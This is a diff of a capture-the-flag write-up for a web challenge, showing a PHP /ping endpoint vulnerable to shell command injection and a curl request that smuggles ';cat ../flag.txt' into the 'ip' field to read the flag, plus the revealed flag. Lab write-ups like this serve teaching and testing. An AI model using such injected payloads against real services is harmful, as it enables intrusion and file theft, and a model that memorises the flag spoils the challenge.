@@ -13,7 +13,7 @@ Tags: _web_
 ## Solution
 When inspecting the source code we can see and enpoint `/ping` that allows us to inject shell commands:
 
-```
+```php
 public function ping($router)
 {
         $jsonBody = json_decode(file_get_contents('php://input'), true);
@@ -33,7 +33,9 @@ public function ping($router)
 
 Or by scheduling an curl command:
 
-```
+```bash
 $ curl -X POST -H 'Content-Type: application/json' -d'{"ip":"0.0.0.0;cat ../flag.txt"}'  http://159.65.81.51:30542/api/ping
 {"output":"PING 0.0.0.0 (0.0.0.0): 56 data bytes\nHTB{4lw4y5_54n1t1z3_u53r_1nput!!!}"}
 ```
+
+Flag `HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}`
